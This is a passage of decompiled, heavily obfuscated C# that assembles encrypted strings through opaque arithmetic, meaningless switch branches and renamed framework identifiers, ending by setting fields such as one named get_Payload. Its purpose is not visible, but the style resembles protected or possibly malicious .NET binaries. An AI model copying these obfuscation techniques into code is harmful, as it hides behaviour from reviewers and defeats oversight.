		object[] array7 = new object[Convert.ToInt32(char.ToString('1') + "10", __c__DisplayClass0_3)];
		array7[Convert.ToInt32("0", Convert.ToInt32("20", 8))] = _003CModule_003E.get_PositiveSign[1];
		int isPublic = IsPublic;
		int num = ((Convert.ToInt32("11111111111111101010001100100010", 2) <= 416167) ? 191 : Convert.ToInt32("354420", 8));
		array7[isPublic] = (char)num;
		array7[array2[_003CModule_003E.ActivityOptions[1]]] = (char)IDLFLAG;
		int num2 = default(int);
		switch (checked(Convert.ToInt32("e49f2", 16) + Convert.ToInt32("fff1b60e", 16)))
		{
		case 0:
			num2 = Convert.ToInt32("3", 8);
			break;
		}
		array7[num2] = (byte)((uint)DataMisalignedException | (false ? 1u : 0u)) != 0;
		array7[0x34E17 ^ Convert.ToInt32("34e13", 16)] = (int)array[(nint)((Array)(object)"\u034d\u035a\u033f\u0309\u0339").LongLength];
		array7[5] = string.Concat(char.ToString('\a'), char.ToString('\u0012'), char.ToString('\0') + "\0\u0002");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_3, array7);
		string string_4 = string.Concat(text, text2, text3 + string_3);
		object[] array8 = new object[5];
		int num3 = checked(Convert.ToInt32("37" + "77" + "4636746", Convert.ToInt32("1000", 2)) + array2[3]) / ((1731097 - Marshal.SizeOf(typeof(LOCK_EX))) ^ -895705);
		int num4 = default(int);
		switch (0 / WrapNonExceptionThrows)
		{
		case 0:
			num4 = -641;
			break;
		}
		checked
		{
			array8[num3] = -1569 * num4 - unchecked(-950591 * Blt_Un);
		}
		array8[1] = (char)CompletionState;
		int num5 = 743619 + (-147585 & (__9__27_20 + 109890));
		string string_5 = "캝";
		object[] array9 = new object[Convert.ToInt32("6", Convert.ToInt32("10", 16))];
		array9[Convert.ToInt32("0", 8)] = (byte)(0 * Convert.ToInt32("37774323352", 8)) != 0;
		array9[1] = checked(array2[7] - 826545);
		array9[Convert.ToInt32("2", ((Array)(object)"\u0319\u0312.\u031e\u0338\u034b\u0369\u0333\u031c\u036b\u0329\u032a\u0337\u034d\u0351.").Length)] = 96;
		array9[3] = (char)_003CModule_003E.KeyValuePair__2[11];
		array9[4] = Convert.ToInt32(char.ToString('1') + "111011", 2);
		array9[5] = 52657;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_5, array9);
		array8[num5] = (byte)Convert.ToInt32(string_5, 8511429 >> _get_DeclaredNestedTypes_d__22) != 0;
		int enableEvents = EnableEvents;
		string text4 = char.ToString((char)(Convert.ToInt32(char.ToString('2') + char.ToString('8') + "25a994", 16) / 596596));
		string string_6 = "ꬠ꯴";
		object[] array10 = new object[(uint)array[3]];
		array10[1 & array[1]] = "䳔Ȫ";
		array10[1] = 10190 % array2[8];
		array10[2] = (char)Convert.ToInt32("3cc9", 16);
		array10[3] = 5946;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_6, array10);
		array8[enableEvents] = text4 + string_6;
		int num6 = array2[4];
		int conv_Ovf_U = Conv_Ovf_U1;
		int num8 = default(int);
		switch (checked((num6 ^ conv_Ovf_U) + -139496))
		{
		case 0:
		{
			int num9 = default(int);
			switch ((nint)((Array)(object)(char.ToString('\u0318') + "\u0351\u0335\u0364\u0320")).LongLength % 2)
			{
			case 0:
				num9 = Convert.ToInt32(char.ToString('6') + "57305", 8);
				break;
			case 1:
				num9 = -946725;
				break;
			case 2:
				num9 = Convert.ToInt32(char.ToString('3') + "7774304023", 8);
				break;
			}
			num8 = num9;
			break;
		}
		case 1:
			num8 = 4;
			break;
		case 2:
		{
			int num7 = Convert.ToInt32("755707", 8);
			num8 = num7 & 0x3FEAC;
			break;
		}
		}
		int num10 = num8;
		int num11 = get_OperandType;
		array8[num10] = (char)num11;
		_003CModule_003E.GetMaxByteCount(ref string_4, array8);
		string string_7 = string_4;
		int eventWritten = EventWritten;
		string string_8 = string.Concat(char.ToString('\ue781') + "\ue780\ue780", char.ToString('\ue780') + "\ue781\ue780", char.ToString('\ue780') + "\ue780\ue780\ue780\ue781\ue780\ue780\ue781\ue781\ue780\ue780\ue780\ue780\ue780");
		object[] array11 = new object[3];
		array11[0] = array2[get_GlobalCount];
		array11[1] = string.Concat(char.ToString('ª'), char.ToString('ග'), char.ToString('ⓢ') + "ᑳT");
		array11[2 | Convert.ToInt32("2", 8)] = '逸';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_8, array11);
		string string_9;
		object[] array12;
		int num12;
		int num13;
		checked
		{
			get_Payload = new Bne_Un(string_7, eventWritten + Convert.ToInt32(string_8, _003CModule_003E.ActivityOptions[0]));
			string_9 = string.Concat(char.ToString('㝇'), "㝇㝇㝆" + "㝇㝆㝆㝇㝇㝆㝆㝆㝇㝆㝆㝆");
			array12 = new object[Convert.ToInt32("37777655155", 8) + 42393];
			array12[0] = '⛛';
			array12[1] = char.ToString(unchecked((char)Convert.ToInt32("664", 8))) + "Əҭ";
			array12[-2 * _003CModule_003E.ActivityOptions[5]] = 906;
			array12[Convert.ToInt32("3", 16) * IsPublic] = unchecked((byte)Convert.ToInt32("0", 16)) != 0;
			num12 = sizeof(short) << array2[1];
			num13 = ((-78247 < AppDomainTimerSafeHandle) ? (-14645) : array2[9]);
		}
		array12[num12] = (char)num13;
		array12[5] = FormatGenericParam;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_9, array12);
		string text5 = char.ToString((char)Convert.ToInt32(string_9, Convert.ToInt32("10", Marshal.SizeOf(typeof(ENODATA)))));
		string string_10 = string.Concat(char.ToString('液'), char.ToString('涼') + "涣涰");
		object[] array13 = new object[Convert.ToInt32(char.ToString('1') + "00", 2)];
		array13[0] = 11259;
		array13[array2[(nint)((Array)(object)"\u033a").LongLength]] = _003CModule_003E.ActivityOptions[12];
		array13[array2[0]] = 'ઇ';
		array13[3] = Convert.ToInt32("37776753013", 8) - -282866;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_10, array13);
		string text6 = string_10;
		string string_11 = string.Concat(char.ToString('酻'), char.ToString('酳') + char.ToString('酸') + "酿酢酤酹");
		object[] array14 = new object[_003CModule_003E.get_PositiveSign[8] % 10];
		array14[0] = 17205;
		array14[(uint)array[2]] = 5238;
		array14[2] = 1293;
		array14[array2[2]] = false;
		array14[4] = 7160;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_11, array14);
		string string_12 = string.Concat(text5, text6 + string_11);
		object[] array15 = new object[Marshal.SizeOf(typeof(Castclass)) % 12];
		int num14 = ~checked(Convert.ToInt32("37777547707", 8) * _003CModule_003E.ActivityOptions[5]);
		string string_13 = string.Concat("䑡䑡" + "䑡䑡" + "䑡䑡䑡䑡䑡䑡䑡䑡䑠䑡", "䑡䑠䑠䑠䑠䑠䑠䑠" + "䑠䑡䑡䑡䑡䑠䑡䑡䑠䑡");
		object[] array16 = new object[get_GlobalCount & 5];
		array16[0] = char.ToString((char)_003CModule_003E.ActivityOptions[96]) + "ᓲҿ";
		array16[1] = '\u009d';
		array16[(uint)array[0]] = 768;
		array16[Marshal.SizeOf(typeof(CharSetMask))] = 467;
		array16[4] = 'ɍ';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_13, array16);
		int num15;
		if (num14 < Convert.ToInt32(string_13, 2))
		{
			string string_14 = string.Concat(char.ToString('䐿'), char.ToString('䐿') + char.ToString('䑢') + "䐵䑢");
			object[] array17 = new object[3];
			array17[0] = false;
			array17[1] = '㢊';
			array17[(uint)array[0]] = array[6];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_14, array17);
			string value = string_14;
			int fromBase = default(int);
			switch (checked(2 * Marshal.SizeOf(typeof(UseHebrewParsing))))
			{
			case 0:
				fromBase = Convert.ToInt32("1001111010111101011", 2);
				break;
			case 1:
				fromBase = array2[10];
				break;
			case 2:
				fromBase = 16;
				break;
			}
			num15 = Convert.ToInt32(value, fromBase);
		}
		else
		{
			num15 = 0 * Popi_popi_popi;
		}
		int num16 = num15;
		int num17 = ((0 != Convert.ToInt32("0", 16)) ? Convert.ToInt32("11111111111111101000001111011100", 2) : (-961814));
		int num18 = checked(962603 + num17);
		string string_15 = "圼圾";
		object[] array18 = new object[6];
		array18[(nint)((Array)(object)string.Empty).LongLength] = (char)_003CModule_003E.ActivityOptions[13];
		array18[1] = 13762;
		array18[(nint)((Array)(object)"\u0340\u035c").LongLength] = Marshal.SizeOf(typeof(get_IsInitOnly)) + -359885;
		array18[3] = "\u0323\u0a70";
		array18[Convert.ToInt32(char.ToString('1') + "00", 2)] = 636;
		int num19 = default(int);
		switch (0 / array2[11])
		{
		case 0:
			num19 = 0;
			break;
		}
		array18[5] = (byte)num19 != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_15, array18);
		array15[num16] = num18 * Convert.ToInt32(string_15, ((Array)(object)(char.ToString('\u0339') + "\u035a\u0328\u036b\u0342\u0321\u0301\u033b")).Length);
		char c3 = (char)Convert.ToInt32("5", 16);
		int num20 = (int)c3 % (10 % Convert.ToInt32("4", 8));
		int num21 = ((51857 < Marshal.SizeOf(typeof(InheritanceDemand))) ? Convert.ToInt32("11111111111110110011000011001010", 2) : Convert.ToInt32("11111111111101001011100100001111", 2));
		int num22 = default(int);
		switch (checked(0 * num21))
		{
		case 0:
			num22 = 0;
			break;
		}
		array15[num20] = (byte)array4[num22] != 0;
		int num23 = array4[Marshal.SizeOf(typeof(UseHebrewParsing))];
		int num24 = ((0 != Convert.ToInt32("0", Convert.ToInt32("2", 8))) ? 942123 : Marshal.SizeOf(typeof(InvalidData)));
		char c4 = (char)num24;
		array15[num23] = (int)c4;
		int num25 = Guid - -259447;
		int num26 = checked(_003CModule_003E.get_PositiveSign[116] * array2[1]);
		int titlecaseLetter = TitlecaseLetter;
		array15[3] = num25 - (num26 + titlecaseLetter);
		bool num27;
		int num29;
		checked
		{
			num27 = unchecked(array2[12] + 316742) - 604548 < Marshal.SizeOf(typeof(Initialize));
			int num28 = ((Convert.ToInt32("fffea06e", 16) < 281344) ? (-54879) : 244788);
			num29 = ((((num28 > 83916) ? 1 : 0) != Convert.ToInt32("0", 16)) ? (Convert.ToInt32("cacc0f88", 16) | Convert.ToInt32("6535101132", 8)) : Convert.ToInt32("0", 16));
		}
		int num30 = (int)(((num27 ? 1 : 0) != num29) ? (_003CModule_003E.KeyValuePair__2[12] % (nint)((Array)(object)("\u0321\u0313" + "\u0334\u0353\u033c\u032f\u0308\u0356")).LongLength) : 951948);
		array15[num30] = 21458;
		int num31 = default(int);
		switch ((-849599 ^ ~array2[13]) / ((_003CModule_003E.KeyValuePair__2[Convert.ToInt32("15", 8)] < 917584) ? (array[8] * array[7]) : 500295))
		{
		case 0:
		{
			char c6 = (char)(577157 - Convert.ToInt32("2147200", 8));
			num31 = c6;
			break;
		}
		case 1:
		{
			string string_16 = string.Concat(char.ToString('녑') + "녕녕", char.ToString('녕') + char.ToString('녔') + "녓녕녒녕녗념");
			object[] array19 = new object[Convert.ToInt32("6", 8)];
			array19[0] = 2;
			array19[_003CModule_003E.ActivityOptions[Convert.ToInt32("2", 8)]] = 4;
			char c5 = (char)_003CModule_003E.get_PositiveSign[117];
			array19[2] = (int)c5;
			array19[checked(474047 - array2[14])] = (byte)checked(Convert.ToInt32("0", 16) * 773473) != 0;
			array19[Convert.ToInt32("4", 16)] = char.ToString((char)Convert.ToInt32("83", 16)) + "➾ᗄ";
			array19[5] = Convert.ToInt32(char.ToString('3') + "3762", 8);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_16, array19);
			num31 = Convert.ToInt32(string_16, 8 | EmptyHandle);
			break;
		}
		}
		array15[num31] = (char)(checked(unchecked(-406332 * CR) + unchecked(-4057995 % get_State)) | '▚');
		_003CModule_003E.GetMaxByteCount(ref string_12, array15);
		AssemblyVersionAttribute = string_12;
		add_ModuleResolve = MultiplyDoublingWideningLowerAndAddSaturate.ConvertToVector128Double;
		AsUIntPtr = new List<string>();
	}
}
